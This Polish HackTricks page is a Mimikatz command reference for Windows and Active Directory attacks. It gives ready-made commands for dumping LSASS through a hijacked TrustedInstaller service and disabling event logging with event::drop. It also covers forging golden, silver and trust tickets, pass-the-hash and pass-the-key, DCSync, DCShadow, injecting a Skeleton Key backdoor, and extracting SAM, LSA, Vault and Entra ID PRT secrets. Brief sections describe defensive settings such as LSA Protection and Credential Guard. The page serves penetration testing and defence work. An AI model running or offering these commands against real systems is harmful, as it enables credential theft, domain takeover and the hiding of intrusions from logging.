# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ta strona opiera się na jednej z [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Sprawdź oryginał po więcej informacji!

## LM and Clear-Text in memory

Od Windows 8.1 i Windows Server 2012 R2 wprowadzono istotne środki ochrony przed kradzieżą poświadczeń:

- **LM hashes i hasła plain-text** nie są już przechowywane w pamięci, aby zwiększyć bezpieczeństwo. Należy skonfigurować odpowiednie ustawienie rejestru, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ z wartością DWORD `0`, aby wyłączyć Digest Authentication i zapewnić, że hasła w "clear-text" nie będą buforowane w LSASS.

- **LSA Protection** zostało wprowadzone, aby chronić proces Local Security Authority (LSA) przed nieautoryzowanym odczytem pamięci i wstrzykiwaniem kodu. Osiąga się to przez oznaczenie LSASS jako chronionego procesu. Aktywacja LSA Protection obejmuje:
1. Modyfikację rejestru w _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ przez ustawienie `RunAsPPL` na `dword:00000001`.
2. Zastosowanie Group Policy Object (GPO), które wymusza tę zmianę rejestru na zarządzanych urządzeniach.

Mimo tych zabezpieczeń narzędzia takie jak Mimikatz mogą ominąć LSA Protection za pomocą specjalnych sterowników, choć takie działania prawdopodobnie zostaną zapisane w event logs.

Na nowoczesnych stacjach roboczych ma to jeszcze większe znaczenie, ponieważ **Credential Guard jest domyślnie włączony na wielu systemach Windows 11 22H2+ i Windows Server 2025 dołączonych do domeny, niebędących DC**, podczas gdy **LSASS-as-PPL jest domyślnie włączony na świeżych instalacjach Windows 11 22H2+**. W praktyce oznacza to, że `sekurlsa::logonpasswords` często zwraca mniej danych, niż zakładały starsze techniki, a operatorzy coraz częściej przechodzą na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** lub moduły ukierunkowane na **CloudAP/PRT**. Po stronie ochrony sprawdź [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administratorzy zazwyczaj mają SeDebugPrivilege, co umożliwia im debugowanie programów. To uprawnienie można ograniczyć, aby zapobiec nieautoryzowanym memory dumps, co jest częstą techniką używaną przez atakujących do wyodrębniania poświadczeń z pamięci. Jednak nawet po usunięciu tego uprawnienia konto TrustedInstaller nadal może wykonywać memory dumps przy użyciu dostosowanej konfiguracji usługi:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
To umożliwia zrzut pamięci `lsass.exe` do pliku, który można następnie przeanalizować na innym systemie, aby wyodrębnić poświadczenia:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opcje Mimikatz

Manipulowanie dziennikami zdarzeń w Mimikatz obejmuje dwa główne działania: czyszczenie dzienników zdarzeń oraz patchowanie usługi Event, aby zapobiec logowaniu nowych zdarzeń. Poniżej znajdują się polecenia do wykonania tych działań:

#### Czyszczenie dzienników zdarzeń

- **Command**: To działanie ma na celu usunięcie dzienników zdarzeń, co utrudnia śledzenie złośliwych aktywności.
- Mimikatz nie udostępnia bezpośredniego polecenia w swojej standardowej dokumentacji do czyszczenia dzienników zdarzeń bezpośrednio z linii poleceń. Jednak manipulacja dziennikami zdarzeń zwykle obejmuje użycie narzędzi systemowych lub skryptów poza Mimikatz do czyszczenia konkretnych logów (np. przy użyciu PowerShell lub Windows Event Viewer).

#### Funkcja eksperymentalna: patchowanie usługi Event

- **Command**: `event::drop`
- To eksperymentalne polecenie zostało zaprojektowane do modyfikowania zachowania usługi Event Logging Service, skutecznie uniemożliwiając jej rejestrowanie nowych zdarzeń.
- Przykład: `mimikatz "privilege::debug" "event::drop" exit`

- Polecenie `privilege::debug` zapewnia, że Mimikatz działa z niezbędnymi uprawnieniami do modyfikowania usług systemowych.
- Polecenie `event::drop` następnie patchuje usługę Event Logging.

### Ataki na bilety Kerberos

Użyj poniższych poleceń jako szybkiej ściągi składni. Dedykowane strony dla [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) oraz [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zawierają aktualne niuanse AES/PAC/opsec.

### Tworzenie Golden Ticket

Golden Ticket umożliwia podszywanie się z dostępem w całej domenie. Kluczowe polecenie i parametry:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Nazwa domeny.
- `/sid`: Security Identifier (SID) domeny.
- `/user`: Nazwa użytkownika, pod którym ma nastąpić impersonacja.
- `/krbtgt`: Hash NTLM konta usługi KDC domeny.
- `/ptt`: Bezpośrednio wstrzykuje ticket do pamięci.
- `/ticket`: Zapisuje ticket do późniejszego użycia.

Przykład:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Tworzenie Silver Ticket

Silver Tickets dają dostęp do konkretnych usług. Kluczowe polecenie i parametry:

- Command: Podobne do Golden Ticket, ale targetuje konkretne usługi.
- Parameters:
- `/service`: Usługa do zaatakowania (np. cifs, http).
- Pozostałe parametry podobne do Golden Ticket.

Przykład:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Tworzenie Trust Ticket

Trust Tickets są używane do uzyskiwania dostępu do zasobów między domenami poprzez wykorzystanie relacji zaufania. Kluczowe polecenie i parametry:

- Command: Podobne do Golden Ticket, ale dla relacji zaufania.
- Parameters:
- `/target`: FQDN domeny docelowej.
- `/rc4`: hash NTLM dla konta zaufania.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Wyświetla wszystkie bilety Kerberos dla bieżącej sesji użytkownika.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Wstrzykuje bilety Kerberos z plików cache.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Umożliwia użycie biletu Kerberos w innej sesji.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Czyści wszystkie bilety Kerberos z sesji.
- Przydatne przed użyciem komend do manipulacji ticketami, aby uniknąć konfliktów.

### Over-Pass-the-Hash / Pass-the-Key

Jeśli `RC4` jest wyłączony lub zawodny, Mimikatz może wpatchować **AES128/AES256 Kerberos keys** do bieżącej sesji logowania zamiast używać tylko NT hash. Zwykle lepiej pasuje to do nowoczesnych domen niż traktowanie `sekurlsa::pth` jako wyłącznie NTLM.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` ponownie używa bieżącego procesu zamiast uruchamiać nową konsolę, co jest wygodne, gdy chcesz od razu uruchomić rzeczy takie jak `lsadump::dcsync` w tym samym kontekście.

### Active Directory Tampering

- **DCShadow**: Tymczasowo sprawia, że maszyna działa jak DC do manipulacji obiektami AD. Zobacz [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naśladuje DC, aby zażądać danych haseł. Zobacz [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Wyodrębnia poświadczenia z LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Podszywa się pod DC, używając danych hasła konta komputera.

- _Nie podano konkretnego polecenia dla NetSync w oryginalnym kontekście._

- **LSADUMP::SAM**: Uzyskuje dostęp do lokalnej bazy SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Odszyfrowuje sekrety przechowywane w rejestrze.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ustawia nowy hash NTLM dla użytkownika.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnianiu trust.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Na hostach **Entra ID** lub **hybrid-joined**, `sekurlsa::cloudap` może ujawnić buforowane dane **Primary Refresh Token (PRT)** z LSASS. Jeśli powiązany klucz Proof-of-Possession jest chroniony programowo, `dpapi::cloudapkd` może wyprowadzić jawny/pochodny materiał klucza potrzebny do dalszych przepływów pracy **Pass-the-PRT**.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
To staje się znacznie trudniejsze, gdy klucz jest wspierany przez TPM, ale warto to sprawdzić na endpointach hybrydowych, ponieważ buforowane dane CloudAP mogą być ciekawsze niż klasyczny wynik `wdigest`. Dla łańcucha nadużyć po stronie chmury zobacz [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Różne

- **MISC::Skeleton**: Wstrzyknij backdoor do LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacja uprawnień

- **PRIVILEGE::Backup**: Uzyskaj prawa backupu.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Uzyskaj uprawnienia debugowania.
- `mimikatz "privilege::debug" exit`

### Zrzut poświadczeń

- **SEKURLSA::LogonPasswords**: Pokaż poświadczenia zalogowanych użytkowników.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Wyodrębnij bilety Kerberos z pamięci.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacja SID i tokenami

- **SID::add/modify**: Zmień SID i SIDHistory.

- Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modyfikuj: _Brak konkretnej komendy dla modify w oryginalnym kontekście._

- **TOKEN::Elevate**: Podszywaj się pod tokeny.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Zezwól na wiele sesji RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Wyświetl listę sesji TS/RDP.
- _Brak konkretnej komendy dla TS::Sessions w oryginalnym kontekście._

### Vault

- Wyodrębnij hasła z Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
